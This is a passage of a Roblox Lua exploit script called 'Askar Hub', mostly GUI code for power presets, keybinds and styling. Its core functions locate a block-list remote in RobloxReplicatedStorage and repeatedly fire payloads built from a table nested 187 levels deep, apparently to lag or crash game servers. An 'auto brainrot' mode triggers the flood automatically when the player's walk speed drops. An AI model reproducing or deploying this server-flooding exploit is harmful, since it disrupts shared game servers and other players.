    Instance.new("UICorner", led).CornerRadius = UDim.new(1,0)
    return led
end
primaryLed = makePowerLed(activePowerButton)
backupLed = makePowerLed(backupPowerButton)
activePowerButton.MouseButton1Click:Connect(function()
    cfg.activePower = 1
    refreshPowerProfile()
    updateToggleButton()
    saveConfig()
end)
backupPowerButton.MouseButton1Click:Connect(function()
    cfg.activePower = 2
    refreshPowerProfile()
    updateToggleButton()
    saveConfig()
end)
refreshPowerProfile()

local autoBrainrotBtn, brainrotKnob
do
    local row = Instance.new("Frame", settingsPage)
    row.Size = UDim2.new(1,0,0,25)
    row.Position = UDim2.new(0,0,0,2)
    row.BackgroundColor3 = rowBg0
    row.BackgroundTransparency = 0.3
    row.BorderSizePixel = 0
    row.ZIndex = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.6,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "AUTO BRAINROT"
    lbl.TextColor3 = text0
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 23
    autoBrainrotBtn = Instance.new("TextButton", row)
    autoBrainrotBtn.Size = UDim2.new(0,38,0,18)
    autoBrainrotBtn.Position = UDim2.new(1,-46,0.5,-9)
    autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and GREEN or TOGGLE_OFF
    autoBrainrotBtn.BorderSizePixel = 0
    autoBrainrotBtn.Text = ""
    autoBrainrotBtn.AutoButtonColor = false
    autoBrainrotBtn.ZIndex = 24
    Instance.new("UICorner", autoBrainrotBtn).CornerRadius = UDim.new(1, 0)
    brainrotKnob = Instance.new("Frame", autoBrainrotBtn)
    brainrotKnob.Size = UDim2.new(0,14,0,14)
    brainrotKnob.Position = cfg.autoBrainrot and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
    brainrotKnob.BackgroundColor3 = TOGGLE_KNOB
    brainrotKnob.BorderSizePixel = 0
    brainrotKnob.ZIndex = 26
    Instance.new("UICorner", brainrotKnob).CornerRadius = UDim.new(1, 0)
    local knobStroke = Instance.new("UIStroke", brainrotKnob)
    knobStroke.Color = Color3.fromRGB(180,180,180)
    knobStroke.Thickness = 1
    autoBrainrotBtn.MouseButton1Click:Connect(function()
        cfg.autoBrainrot = not cfg.autoBrainrot
        if cfg.autoBrainrot then
            tw(autoBrainrotBtn, {BackgroundColor3 = GREEN}, 0.15)
            tw(brainrotKnob, {Position = UDim2.new(1,-16,0.5,-7)}, 0.15)
        else
            tw(autoBrainrotBtn, {BackgroundColor3 = TOGGLE_OFF}, 0.15)
            tw(brainrotKnob, {Position = UDim2.new(0,2,0.5,-7)}, 0.15)
            if active then flipLag(false, false) end
        end
        saveConfig()
    end)
end

local keybindKbRow, keybindGpRow
do
    local row = Instance.new("Frame", settingsPage)
    row.Size = UDim2.new(1,0,0,25)
    row.Position = UDim2.new(0,0,0,31)
    row.BackgroundColor3 = rowBg0
    row.BackgroundTransparency = 0.3
    row.BorderSizePixel = 0
    row.ZIndex = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.4,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "KEYBOARD"
    lbl.TextColor3 = text0
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 23
    keybindKbRow = Instance.new("TextButton", row)
    keybindKbRow.Size = UDim2.new(0,84,0,18)
    keybindKbRow.Position = UDim2.new(1,-92,0.5,-9)
    keybindKbRow.BackgroundColor3 = rowBoxBg0
    keybindKbRow.BackgroundTransparency = 0.25
    keybindKbRow.BorderSizePixel = 0
    keybindKbRow.Text = cfg.keybindKb
    keybindKbRow.TextColor3 = stroke0
    keybindKbRow.Font = Enum.Font.GothamBold
    keybindKbRow.TextSize = 9
    keybindKbRow.ZIndex = 24
    Instance.new("UICorner", keybindKbRow).CornerRadius = UDim.new(0, 4)
    addStroke(keybindKbRow, 1, 0.3)
    keybindKbRow.MouseButton1Click:Connect(function()
        listeningFor = (listeningFor == "kb") and nil or "kb"
        keybindKbRow.Text = listeningFor == "kb" and "[?]" or cfg.keybindKb
    end)

    local row2 = Instance.new("Frame", settingsPage)
    row2.Size = UDim2.new(1,0,0,25)
    row2.Position = UDim2.new(0,0,0,60)
    row2.BackgroundColor3 = rowBg0
    row2.BackgroundTransparency = 0.3
    row2.BorderSizePixel = 0
    row2.ZIndex = 22
    Instance.new("UICorner", row2).CornerRadius = UDim.new(0, 5)
    local lbl2 = Instance.new("TextLabel", row2)
    lbl2.Size = UDim2.new(0.4,0,1,0)
    lbl2.Position = UDim2.new(0,8,0,0)
    lbl2.BackgroundTransparency = 1
    lbl2.Text = "CONTROLLER"
    lbl2.TextColor3 = text0
    lbl2.Font = Enum.Font.GothamBold
    lbl2.TextSize = 9
    lbl2.TextXAlignment = Enum.TextXAlignment.Left
    lbl2.ZIndex = 23
    keybindGpRow = Instance.new("TextButton", row2)
    keybindGpRow.Size = UDim2.new(0,84,0,18)
    keybindGpRow.Position = UDim2.new(1,-92,0.5,-9)
    keybindGpRow.BackgroundColor3 = rowBoxBg0
    keybindGpRow.BackgroundTransparency = 0.25
    keybindGpRow.BorderSizePixel = 0
    keybindGpRow.Text = cfg.keybindGp
    keybindGpRow.TextColor3 = stroke0
    keybindGpRow.Font = Enum.Font.GothamBold
    keybindGpRow.TextSize = 9
    keybindGpRow.ZIndex = 24
    Instance.new("UICorner", keybindGpRow).CornerRadius = UDim.new(0, 4)
    addStroke(keybindGpRow, 1, 0.3)
    keybindGpRow.MouseButton1Click:Connect(function()
        listeningFor = (listeningFor == "gp") and nil or "gp"
        keybindGpRow.Text = listeningFor == "gp" and "[?]" or cfg.keybindGp
    end)
end

local bgRow
do
    local row = Instance.new("Frame", configPage)
    row.Size = UDim2.new(1,0,0,25)
    row.Position = UDim2.new(0,0,0,89)
    row.BackgroundColor3 = rowBg0
    row.BackgroundTransparency = 0.3
    row.BorderSizePixel = 0
    row.ZIndex = 22
    Instance.new("UICorner", row).CornerRadius = UDim.new(0, 5)
    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.4,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "FONDO"
    lbl.TextColor3 = text0
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 23
    bgRow = Instance.new("TextButton", row)
    bgRow.Size = UDim2.new(0,58,0,18)
    bgRow.Position = UDim2.new(1,-80,0.5,-9)
    bgRow.BackgroundColor3 = rowBoxBg0
    bgRow.BackgroundTransparency = 0.25
    bgRow.BorderSizePixel = 0
    bgRow.Text = getBgName()
    bgRow.TextColor3 = stroke0
    bgRow.Font = Enum.Font.GothamBold
    bgRow.TextSize = 9
    bgRow.ZIndex = 24
    Instance.new("UICorner", bgRow).CornerRadius = UDim.new(0, 4)
    addStroke(bgRow, 1, 0.3)
    local function cycleBackground(delta)
        bgIndex = ((bgIndex - 1 + delta) % #BG_LIST) + 1
        local newId = getBgId()
        mainBgImage.Image = newId
        settingsBgImage.Image = newId
        bgRow.Text = getBgName()
        applyAccentColors()
        updateToggleButton()
    end
    local bgLeft = Instance.new("TextButton", row)
    bgLeft.Name = "backgroundArrowLeft"
    bgLeft.Size = UDim2.new(0,16,0,18)
    bgLeft.Position = UDim2.new(1,-101,0.5,-9)
    bgLeft.BackgroundColor3 = rowBoxBg0
    bgLeft.BorderSizePixel = 0
    bgLeft.Text = "<"
    bgLeft.TextColor3 = stroke0
    bgLeft.Font = Enum.Font.GothamBlack
    bgLeft.TextSize = 10
    bgLeft.AutoButtonColor = false
    bgLeft.ZIndex = 24
    Instance.new("UICorner", bgLeft).CornerRadius = UDim.new(1,0)
    addStroke(bgLeft, 1, 0.3)
    local bgRight = bgLeft:Clone()
    bgRight.Name = "backgroundArrowRight"
    bgRight.Position = UDim2.new(1,-20,0.5,-9)
    bgRight.Text = ">"
    bgRight.Parent = row
    bgLeft.MouseButton1Click:Connect(function() cycleBackground(-1) end)
    bgRight.MouseButton1Click:Connect(function() cycleBackground(1) end)
    bgRow.MouseButton1Click:Connect(function() cycleBackground(1) end)
end

local borderRow = Instance.new("Frame", configPage)
borderRow.Name = "BorderColorRow"
borderRow.Size = UDim2.new(1,0,0,25)
borderRow.Position = UDim2.new(0,0,0,118)
borderRow.BackgroundColor3 = rowBg0
borderRow.BackgroundTransparency = 0.3
borderRow.BorderSizePixel = 0
borderRow.ZIndex = 22
Instance.new("UICorner", borderRow).CornerRadius = UDim.new(0, 5)
local borderLbl = Instance.new("TextLabel", borderRow)
borderLbl.Size = UDim2.new(0,62,1,0)
borderLbl.Position = UDim2.new(0,8,0,0)
borderLbl.BackgroundTransparency = 1
borderLbl.Text = "BORDER"
borderLbl.TextColor3 = text0
borderLbl.Font = Enum.Font.GothamBold
borderLbl.TextSize = 9
borderLbl.TextXAlignment = Enum.TextXAlignment.Left
borderLbl.ZIndex = 23
local colorLeft = Instance.new("TextButton", borderRow)
colorLeft.Name = "colorArrowLeft"
colorLeft.Size = UDim2.new(0,16,0,18)
colorLeft.Position = UDim2.new(0,67,0.5,-9)
colorLeft.BackgroundColor3 = rowBoxBg0
colorLeft.BorderSizePixel = 0
colorLeft.Text = "<"
colorLeft.TextColor3 = stroke0
colorLeft.Font = Enum.Font.GothamBlack
colorLeft.TextSize = 10
colorLeft.AutoButtonColor = false
colorLeft.ZIndex = 24
Instance.new("UICorner", colorLeft).CornerRadius = UDim.new(1,0)
addStroke(colorLeft, 1, 0.3)
local colorRight = colorLeft:Clone()
colorRight.Name = "colorArrowRight"
colorRight.Position = UDim2.new(1,-23,0.5,-9)
colorRight.Text = ">"
colorRight.Parent = borderRow
local colorDots = Instance.new("Frame", borderRow)
colorDots.Name = "ColorDots"
colorDots.Size = UDim2.new(0,94,0,18)
colorDots.Position = UDim2.new(0,86,0.5,-9)
colorDots.ClipsDescendants = true
colorDots.BackgroundTransparency = 1
colorDots.ZIndex = 24
local colorDotLayout = Instance.new("UIListLayout", colorDots)
colorDotLayout.FillDirection = Enum.FillDirection.Horizontal
colorDotLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
colorDotLayout.VerticalAlignment = Enum.VerticalAlignment.Center
colorDotLayout.Padding = UDim.new(0,1)
local colorDotList = {}
local colorWindowStart = 1
local function updateColorDots()
    colorWindowStart = math.max(1, math.min(colorIndex - 3, #COLOR_OPTIONS - 6))
    for i, dot in ipairs(colorDotList) do
        local visible = i >= colorWindowStart and i < colorWindowStart + 7
        dot.Visible = visible
        local st = dot:FindFirstChild("DotStroke")
        if st then st.Thickness = (customStroke and i == colorIndex) and 2 or 1 end
        dot.BackgroundTransparency = (customStroke and i == colorIndex) and 0 or 0.15
    end
end
local function chooseBorderColor(index)
    colorIndex = ((index - 1) % #COLOR_OPTIONS) + 1
    customStroke = COLOR_OPTIONS[colorIndex]
    updateColorDots()
    applyAccentColors()
end
for i, color in ipairs(COLOR_OPTIONS) do
    local dot = Instance.new("TextButton", colorDots)
    dot.Name = "colorDot" .. i
    dot.Size = UDim2.new(0,10,0,10)
    dot.BackgroundColor3 = color
    dot.BorderSizePixel = 0
    dot.Text = ""
    dot.AutoButtonColor = false
    dot.ZIndex = 25
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)
    local ds = Instance.new("UIStroke", dot)
    ds.Name = "DotStroke"
    ds.Color = Color3.fromRGB(255,255,255)
    ds.Thickness = 1
    ds.Transparency = 0.1
    table.insert(colorDotList, dot)
    dot.MouseButton1Click:Connect(function() chooseBorderColor(i) end)
end
colorLeft.MouseButton1Click:Connect(function() chooseBorderColor(colorIndex - 1) end)
colorRight.MouseButton1Click:Connect(function() chooseBorderColor(colorIndex + 1) end)
updateColorDots()

local resetBtn = Instance.new("TextButton", configPage)
resetBtn.Size = UDim2.new(1,0,0,22)
resetBtn.Position = UDim2.new(0,0,0,148)
resetBtn.BackgroundColor3 = rowBg0
resetBtn.BackgroundTransparency = 0.3
resetBtn.BorderSizePixel = 0
resetBtn.AutoButtonColor = false
resetBtn.Text = "RESET DEFAULTS"
resetBtn.TextColor3 = text0
resetBtn.Font = Enum.Font.GothamBold
resetBtn.TextSize = 9
resetBtn.ZIndex = 22
Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 5)
local resetStroke = Instance.new("UIStroke", resetBtn)
resetStroke.Color = stroke0
resetStroke.Thickness = 1
resetStroke.Transparency = 0.3
resetBtn.MouseButton1Click:Connect(function()
    cfg.power1 = DEFAULT_CFG.power1
    cfg.power2 = DEFAULT_CFG.power2
    cfg.interval1 = DEFAULT_CFG.interval1
    cfg.interval2 = DEFAULT_CFG.interval2
    cfg.activePower = DEFAULT_CFG.activePower
    cfg.power = cfg.power1
    cfg.interval = cfg.interval1
    cfg.keybindKb = DEFAULT_CFG.keybindKb
    cfg.keybindGp = DEFAULT_CFG.keybindGp
    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
    customStroke = nil
    colorIndex = 1
    updateColorDots()
    refreshPowerProfile()
    keybindKbRow.Text = cfg.keybindKb
    keybindGpRow.Text = cfg.keybindGp
    if autoBrainrotBtn then
        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and GREEN or TOGGLE_OFF
        brainrotKnob.Position = cfg.autoBrainrot and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
    end
    saveConfig()
end)

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local found = nil
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
            found = r
            break
        end
    end
    if not found then
        for _, c in ipairs(rrs:GetChildren()) do
            if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find("Block") then
                found = c
                break
            end
        end
    end
    return found
end

remote = findRemote()

local function buildPayload(power)
    local safePower = tonumber(power) or DEFAULT_CFG.power
    if safePower < 1 then safePower = 1 end
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(safePower / 188), 10000)
    if maxRep < 1 then maxRep = 1 end
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    if not active or not remote then
        pingLoopRunning = false
        return
    end
    pingLoopRunning = true
    local currentDelay = tonumber(cfg.interval) or DEFAULT_CFG.interval
    while active and remote and pingLoopRunning do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function()
            if remote:IsA("RemoteFunction") then
                remote:InvokeServer(payload)
            else
                remote:FireServer(payload)
            end
        end)
        if not ok then
            currentDelay = math.min(currentDelay * 1.5, 0.5)
        else
            currentDelay = math.max(currentDelay * 0.995, 0.05)
        end
        task.wait(currentDelay)
    end
    pingLoopRunning = false
end

local function flipLag(state, isManual)
    if not state and pingLoopRunning then
        pingLoopRunning = false
    end
    active = state
    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end
    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                updateToggleButton()
                return
            end
        end
        updateToggleButton()
        task.spawn(runPingLoop)
    else
        updateToggleButton()
    end
end

applyAccentColors = function()
    local accent = getAccent()
    local textColor = getText()
    local strokeColor = getStroke()
    local accentDim = accent:Lerp(Color3.new(0,0,0), 0.4)
    local rowBg = Color3.new(accent.R*0.2, accent.G*0.2, accent.B*0.2)
    local rowBoxBg = Color3.new(accent.R*0.15, accent.G*0.15, accent.B*0.15)
    local tabAct = Color3.new(accent.R*0.3, accent.G*0.3, accent.B*0.3)
    local tabInact = Color3.new(accent.R*0.1, accent.G*0.1, accent.B*0.1)

    mainStroke.Color = strokeColor
    ss.Color = strokeColor
    aStroke.Color = strokeColor
    resetStroke.Color = strokeColor

    local function walk(obj)
        if not obj then return end
        local skipSelf = (obj.Name:find("^colorDot") ~= nil or obj.Name == "statusPill" or obj.Name == "statusLbl" or obj.Name == "autoBrainrotBtn" or obj.Name == "brainrotKnob")
        local skipParent = (obj.Parent == statusPill or obj.Parent == autoBrainrotBtn)
        if not skipSelf and not skipParent then
            if obj:IsA("TextLabel") then
                if obj == titleLbl then
                    obj.TextColor3 = strokeColor
                    obj.TextStrokeColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.55)
                elseif obj == setTitle then
                    obj.TextColor3 = strokeColor
                    obj.TextStrokeColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.6)
                else
                    obj.TextColor3 = textColor
                end
            elseif obj:IsA("TextButton") then
                if obj == activateBtn then
                    obj.BackgroundColor3 = rowBg
                    obj.TextColor3 = textColor
                elseif obj == tabPower then
                    if powerPage.Visible then
                        obj.BackgroundColor3 = tabAct
                        obj.TextColor3 = strokeColor
                    else
                        obj.BackgroundColor3 = tabInact
                        obj.TextColor3 = textColor
                    end
                elseif obj == tabSettings then
                    if settingsPage.Visible then
                        obj.BackgroundColor3 = tabAct
                        obj.TextColor3 = strokeColor
                    else
                        obj.BackgroundColor3 = tabInact
                        obj.TextColor3 = textColor
                    end
                elseif false then -- tabConfig removed
                    if configPage.Visible then
                        obj.BackgroundColor3 = tabAct
                        obj.TextColor3 = strokeColor
                    else
                        obj.BackgroundColor3 = tabInact
                        obj.TextColor3 = textColor
                    end
                elseif obj == resetBtn then
                    obj.BackgroundColor3 = rowBg
                    obj.TextColor3 = textColor
                elseif obj == keybindKbRow or obj == keybindGpRow or obj == bgRow or obj == setCloseBtn then
                    obj.BackgroundColor3 = rowBoxBg
                    obj.TextColor3 = strokeColor
                elseif obj == lockBtn and uiLocked then
                    obj.BackgroundColor3 = strokeColor
                    obj.TextColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.7)
                else
                    obj.BackgroundColor3 = rowBg
                    obj.TextColor3 = textColor
                end
            elseif obj:IsA("TextBox") then
                obj.BackgroundColor3 = rowBoxBg
                obj.TextColor3 = strokeColor
            elseif obj:IsA("Frame") then
                if obj == mainFrame or obj == settingsFrame or obj == darkOverlay or obj == settingsOverlay then
                    obj.BackgroundColor3 = Color3.fromRGB(0,0,0)
                elseif obj == header or obj == setHeader or obj == btnContainer or obj == tabBar or obj == pagesFrame or obj == powerPage or obj == settingsPage  or obj == mainContent or obj == profileRow then
                else
                    obj.BackgroundColor3 = rowBg
                end
            end
            for _, st in ipairs(obj:GetChildren()) do
                if st:IsA("UIStroke") then
                    st.Color = strokeColor
                end
            end
        end
        for _, child in ipairs(obj:GetChildren()) do
            walk(child)
        end
    end
    walk(screen)
    if activePowerButton and backupPowerButton then refreshPowerProfile() end
    if not active then
        ag.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, accentDim),
            ColorSequenceKeypoint.new(1, accent)
        })
    end
end

activateBtn.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)

lockBtn.MouseButton1Click:Connect(function()
    uiLocked = not uiLocked
    local strokeColor = getStroke()
    local accent = getAccent()
    if uiLocked then
        lockBtn.Text = "🔒"
        lockBtn.BackgroundColor3 = strokeColor
        lockBtn.TextColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.7)
        mainStroke.Transparency = 0.05
    else
        lockBtn.Text = "🔓"
        lockBtn.BackgroundColor3 = Color3.new(accent.R*0.2, accent.G*0.2, accent.B*0.2)
        lockBtn.TextColor3 = getText()
        mainStroke.Transparency = 0.2
    end
end)

minimizeBtn.MouseButton1Click:Connect(function()
    if pingMinimized then
        pingMinimized = false
        mainContent.Visible = true
        mainFrame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
        minimizeBtn.Text = "—"
    else
        pingMinimized = true
        mainContent.Visible = false
        mainFrame.Size = UDim2.new(0, MAIN_W, 0, MIN_HEIGHT)
        minimizeBtn.Text = "+"
    end
end)

gearBtn.MouseButton1Click:Connect(function()
    settingsFrame.Visible = not settingsFrame.Visible
end)

RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
            if active then flipLag(false, false) end
        end
        return
    end
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local currentSpeed = hum.WalkSpeed
    if currentSpeed < 25 then
        if not lastBrainrotState then
            brainrotMode = true
            lastBrainrotState = true
            manualOverride = false
            if not active then flipLag(true, false) end
        end
    else
        if lastBrainrotState then
            brainrotMode = false
            lastBrainrotState = false
            manualOverride = false
            if active then flipLag(false, false) end
        end
    end
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
    local isGp = isGamepadKeyCode(kc)

    if listeningFor then
        local newKey = nil
        if isKb then newKey = kc
        elseif isGp then newKey = kc end
        if newKey and not BLACKLISTED[kc] then
            if listeningFor == "gp" then
                cfg.keybindGp = newKey.Name
                keybindGpRow.Text = newKey.Name
            else
                cfg.keybindKb = newKey.Name
                keybindKbRow.Text = newKey.Name
            end
            listeningFor = nil
            saveConfig()
        end
        return
    end

    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        if not mainFrame.Visible then settingsFrame.Visible = false end
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)
    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

tabPower.MouseButton1Click:Connect(function()
    selectTab("power")
    applyAccentColors()
end)

tabSettings.MouseButton1Click:Connect(function()
    selectTab("settings")
    applyAccentColors()
end)

if tonumber(savedUi.bgIndex) then
    bgIndex = math.max(1, math.min(math.floor(savedUi.bgIndex), #BG_LIST))
    local restoredId = getBgId()
    mainBgImage.Image = restoredId
    settingsBgImage.Image = restoredId
    if bgRow then bgRow.Text = getBgName() end
end
if tonumber(savedUi.colorIndex) then colorIndex = math.max(1, math.min(math.floor(savedUi.colorIndex), #COLOR_OPTIONS)) end
if type(savedUi.customStroke) == "table" then
    customStroke = Color3.new(tonumber(savedUi.customStroke[1]) or 1, tonumber(savedUi.customStroke[2]) or 1, tonumber(savedUi.customStroke[3]) or 1)
end
if updateColorDots then updateColorDots() end


-- Force Askar Hub background
pcall(function()
    mainBgImage.Image = "rbxassetid://106558261630132"
    settingsBgImage.Image = "rbxassetid://106558261630132"
end)

active = false
pingLoopRunning = false
brainrotMode = false
lastBrainrotState = false
updateToggleButton()
selectTab("power")


applyAccentColors()

-- Restore saved power/interval into UI + preset highlight
task.defer(function()
    cfg.power = cfg.power1
    cfg.interval = cfg.interval1
    if powerBox then powerBox.Text = tostring(cfg.power1 or 100000) end
    if delayBox1 then delayBox1.Text = tostring(cfg.interval1 or 0.13) end
    if cfg.selectedPreset == "LOW" then
        if setPresetVisual then setPresetVisual(mainLowBtn) end
    elseif cfg.selectedPreset == "MED" then
        if setPresetVisual then setPresetVisual(mainMedBtn) end
    elseif cfg.selectedPreset == "HIGH" then
        if setPresetVisual then setPresetVisual(mainHighBtn) end
    end
    print("[Askar Hub] UI restored power=" .. tostring(cfg.power1) .. " delay=" .. tostring(cfg.interval1))
end)
